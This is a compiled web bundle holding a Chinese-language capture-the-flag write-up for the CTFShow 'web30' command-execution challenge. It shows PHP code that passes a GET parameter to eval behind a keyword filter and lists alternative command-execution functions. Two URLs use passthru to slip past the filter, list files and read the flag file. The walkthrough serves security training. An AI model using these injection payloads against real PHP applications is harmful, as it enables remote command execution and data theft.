"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[895],{4081:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>d,contentTitle:()=>l,default:()=>h,frontMatter:()=>i,metadata:()=>s,toc:()=>a});const s=JSON.parse('{"id":"Independent-Environment/CTFShow/WEB\u5165\u95e8/\u547d\u4ee4\u6267\u884c/web30","title":"web30","description":"\u76ee\u524d\u6765\u770b\uff0c\u662f\u62e6\u622a\u4e86stystem\u548cflag\u5173\u952e\u8bcd\uff0c\u4f46\u662fphp\u4e2d\u4e0d\u6b62\u6709system\u51fd\u6570\u53ef\u4ee5\u6267\u884c\u547d\u4ee4","source":"@site/docs/Independent-Environment/CTFShow/WEB\u5165\u95e8/\u547d\u4ee4\u6267\u884c/web30.md","sourceDirName":"Independent-Environment/CTFShow/WEB\u5165\u95e8/\u547d\u4ee4\u6267\u884c","slug":"/Independent-Environment/CTFShow/WEB\u5165\u95e8/\u547d\u4ee4\u6267\u884c/web30","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/CTFShow/WEB\u5165\u95e8/\u547d\u4ee4\u6267\u884c/web30","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Independent-Environment/CTFShow/WEB\u5165\u95e8/\u547d\u4ee4\u6267\u884c/web30.md","tags":[],"version":"current","frontMatter":{},"sidebar":"Independent_Environment_Sidebar","previous":{"title":"web29","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/CTFShow/WEB\u5165\u95e8/\u547d\u4ee4\u6267\u884c/web29"},"next":{"title":"web31","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/CTFShow/WEB\u5165\u95e8/\u547d\u4ee4\u6267\u884c/web31"}}');var c=t(74848),r=t(28453);const i={},l="web30",d={},a=[];function o(e){const n={code:"code",h1:"h1",header:"header",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,r.R)(),...e.components};return(0,c.jsxs)(c.Fragment,{children:[(0,c.jsx)(n.header,{children:(0,c.jsx)(n.h1,{id:"web30",children:"web30"})}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-php",children:"error_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|system|php/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n}\n"})}),"\n",(0,c.jsxs)(n.p,{children:["\u76ee\u524d\u6765\u770b\uff0c\u662f\u62e6\u622a\u4e86",(0,c.jsx)(n.code,{children:"stystem"}),"\u548c",(0,c.jsx)(n.code,{children:"flag"}),"\u5173\u952e\u8bcd\uff0c\u4f46\u662fphp\u4e2d\u4e0d\u6b62\u6709",(0,c.jsx)(n.code,{children:"system"}),"\u51fd\u6570\u53ef\u4ee5\u6267\u884c\u547d\u4ee4"]}),"\n",(0,c.jsxs)(n.ul,{children:["\n",(0,c.jsx)(n.li,{children:"system"}),"\n",(0,c.jsx)(n.li,{children:"passthru"}),"\n",(0,c.jsx)(n.li,{children:"exec"}),"\n",(0,c.jsx)(n.li,{children:"pcntl_exec"}),"\n",(0,c.jsx)(n.li,{children:"shell_exec"}),"\n",(0,c.jsx)(n.li,{children:"popen / proc_open"}),"\n",(0,c.jsx)(n.li,{children:"\u53cd\u5f15\u53f7``"}),"\n"]}),"\n",(0,c.jsxs)(n.p,{children:["\u90a3\u4e48\u76f4\u63a5\u4f7f\u7528",(0,c.jsx)(n.code,{children:"passthru"}),"\u5373\u53ef\uff0c\u800c\u4e14",(0,c.jsx)(n.code,{children:"passthru"}),"\u51fd\u6570\u81ea\u5e26\u8f93\u51fa\u7ed3\u679c\u7684\u7279\u6027"]}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-plaintext",children:'https://84bc19c2-1327-4bab-8522-6e67439e685c.challenge.ctf.show/?c=passthru("ls -lh");\n'})}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.img,{alt:"img",src:t(58900).A+"",width:"2560",height:"1540"})}),"\n",(0,c.jsx)(n.p,{children:"\u90a3\u4e48\u76f4\u63a5\u8bfb\u53d6flag\u5373\u53ef"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-plaintext",children:'https://84bc19c2-1327-4bab-8522-6e67439e685c.challenge.ctf.show/?c=passthru("cat /var/www/html/fl*");\n'})}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.img,{alt:"img",src:t(97789).A+"",width:"2560",height:"1540"})})]})}function h(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,c.jsx)(n,{...e,children:(0,c.jsx)(o,{...e})}):o(e)}},58900:(e,n,t)=>{t.d(n,{A:()=>s});const s=t.p+"assets/images/image_20250209-180939-5191cdcea9148ee38f869e6105fa4f59.png"},97789:(e,n,t)=>{t.d(n,{A:()=>s});const s=t.p+"assets/images/image_20250213-181354-0f08e311db6cfece06b6319e9769817c.png"},28453:(e,n,t)=>{t.d(n,{R:()=>i,x:()=>l});var s=t(96540);const c={},r=s.createContext(c);function i(e){const n=s.useContext(r);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(c):e.components||c:i(e.components),s.createElement(r.Provider,{value:n},e.children)}}}]);